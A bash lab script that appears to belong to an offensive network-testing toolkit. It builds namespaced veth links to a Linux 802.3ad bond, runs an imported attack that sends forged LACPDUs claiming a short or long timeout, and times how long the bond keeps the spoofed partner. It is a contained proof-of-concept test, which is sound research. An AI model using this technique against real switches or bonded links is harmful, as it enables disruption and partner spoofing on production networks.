#!/usr/bin/env bash
# LAG misconfiguration abuse lab (Linux only, needs root). Uses the kernel bonding driver in 802.3ad mode.
#
# Topology, all inside network namespaces:
#
#   sw:       bond0 in 802.3ad (LACP) mode, with one slave, s1. This is the aggregate under test.
#   attacker: the other end of the link, a1. It sends a few LACPDUs and then stops.
#
# Two cases, each with a fresh bond, run one after the other:
#
#   short: the attacker claims the short timeout (Timeout bit set). The partner should expire within
#          seconds of the last LACPDU, because a short-timeout partner is refreshed every second.
#   long:  the attacker claims the long timeout (Timeout bit clear). An aggregate that follows the
#          claimed mode keeps the partner for about 90 seconds; one that checks the rate expires it
#          in seconds.
#
# For each case the lab samples the partner the bond reports once a second after the last LACPDU,
# and records the second at which the partner disappears (or that it has not disappeared after
# MAX_WAIT seconds).
#
# Exit 0 when the bond accepts the long-timeout partner for more than 10 seconds after the last
# LACPDU, and the short-timeout partner expires within 10 seconds (the control works).
# Exit 1 when either partner is not accepted, or the long-timeout partner expires within 10 seconds.
# Exit 2 when the control does not expire the short-timeout partner within MAX_WAIT seconds, or the
# setup failed.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/lag_misconfiguration_abuse_lab.sh
#
# Requirements: iproute2 (ip), the bonding kernel module, and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done
if ! modprobe bonding 2>/dev/null; then
    echo "The bonding kernel module is needed." >&2
    exit 2
fi

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
CLAIMED_SYSTEM="02:00:00:00:00:c3"
CLAIMED_KEY=7
FRAMES=3
INTERVAL=1.0
BOND_WAIT=4
MAX_WAIT=45
LONG_OK_SECONDS=10
NO_PARTNER="00:00:00:00:00:00"

stop_lab() {
    for ns in attacker sw; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
trap stop_lab EXIT

# The partner the bond has learned, from its status file (the active aggregator's partner MAC).
partner() {
    ip netns exec sw cat /proc/net/bonding/bond0 2>/dev/null \
        | grep -m1 'Partner Mac Address' | awk '{print $NF}' || true
}

setup_bond() {
    stop_lab
    ip netns add sw
    ip netns add attacker
    ip link add s1 type veth peer name a1
    ip link set s1 netns sw
    ip link set a1 netns attacker
    ip netns exec sw ip link add bond0 type bond mode 802.3ad miimon 100 lacp_rate fast
    ip netns exec sw ip link set bond0 up
    ip netns exec sw ip link set s1 down
    ip netns exec sw ip link set s1 master bond0
    ip netns exec sw ip link set s1 up
    ip netns exec attacker ip link set a1 up
    sleep "$BOND_WAIT"
    if [[ "$(partner)" != "$NO_PARTNER" && -n "$(partner)" ]]; then
        echo "Control: the bond had a partner before the attack. Result unreliable."
        exit 2
    fi
}

ATTACK_CODE='
import os, threading
from macabre.attacks.lag_misconfiguration_abuse import LagMisconfigurationConfig, run_lag_misconfiguration
stats = run_lag_misconfiguration(
    LagMisconfigurationConfig(
        iface="a1",
        system_mac=os.environ["CLAIMED_SYSTEM"],
        key=int(os.environ["CLAIMED_KEY"]),
        timeout=os.environ["TIMEOUT_MODE"],
        frames=int(os.environ["FRAMES"]),
        interval=float(os.environ["INTERVAL"]),
    ),
    threading.Event(),
    lambda _: None,
)
print(stats.frames)
'

# Run one case. Sets CASE_ACCEPTED (yes/no) and CASE_EXPIRY (seconds, or "none" if still present).
run_case() {
    local mode="$1"
    echo "Case: $mode timeout, $FRAMES LACPDUs claiming system $CLAIMED_SYSTEM, key $CLAIMED_KEY, every ${INTERVAL}s"
    setup_bond
    ip netns exec attacker env PYTHONPATH="$ROOT/src" CLAIMED_SYSTEM="$CLAIMED_SYSTEM" CLAIMED_KEY="$CLAIMED_KEY" \
        TIMEOUT_MODE="$mode" FRAMES="$FRAMES" INTERVAL="$INTERVAL" \
        "$PY" -c "$ATTACK_CODE" >/dev/null
    local seen
    seen="$(partner)"
    echo "  right after the last LACPDU the bond reports partner: ${seen:-none}"
    if [[ "$seen" != "$CLAIMED_SYSTEM" ]]; then
        CASE_ACCEPTED="no"
        CASE_EXPIRY="none"
        echo "  the bond did not accept the claimed partner"
        echo
        return
    fi
    CASE_ACCEPTED="yes"
    CASE_EXPIRY="none"
    for second in $(seq 1 "$MAX_WAIT"); do
        sleep 1
        if [[ "$(partner)" != "$CLAIMED_SYSTEM" ]]; then
            CASE_EXPIRY="$second"
            break
        fi
    done
    echo "  partner expired after: ${CASE_EXPIRY} s (none = still present after ${MAX_WAIT} s)"
    echo
}

run_case short
SHORT_ACCEPTED="$CASE_ACCEPTED"
SHORT_EXPIRY="$CASE_EXPIRY"

run_case long
LONG_ACCEPTED="$CASE_ACCEPTED"
LONG_EXPIRY="$CASE_EXPIRY"

if [[ "$SHORT_ACCEPTED" != "yes" || "$LONG_ACCEPTED" != "yes" ]]; then
    echo "Result: the bond did not accept the claimed partner in both cases (short: $SHORT_ACCEPTED, long: $LONG_ACCEPTED). Not validated."
    exit 1
fi
if [[ "$SHORT_EXPIRY" == "none" ]] || (( SHORT_EXPIRY > LONG_OK_SECONDS )); then
    echo "Control: the short-timeout partner did not expire within ${LONG_OK_SECONDS} s (expiry: $SHORT_EXPIRY s). Result unreliable."
    exit 2
fi
if [[ "$LONG_EXPIRY" == "none" ]] || (( LONG_EXPIRY > LONG_OK_SECONDS )); then
    echo "Result: the bond kept the long-timeout partner for more than ${LONG_OK_SECONDS} s after the last LACPDU (expiry: $LONG_EXPIRY s), while the short-timeout partner expired after $SHORT_EXPIRY s. The claimed timeout mode is honoured although the link does not send at that rate. Vulnerable."
    exit 0
fi
echo "Result: the long-timeout partner expired after $LONG_EXPIRY s, in line with the link's real rate (short: $SHORT_EXPIRY s). Not validated."
exit 1
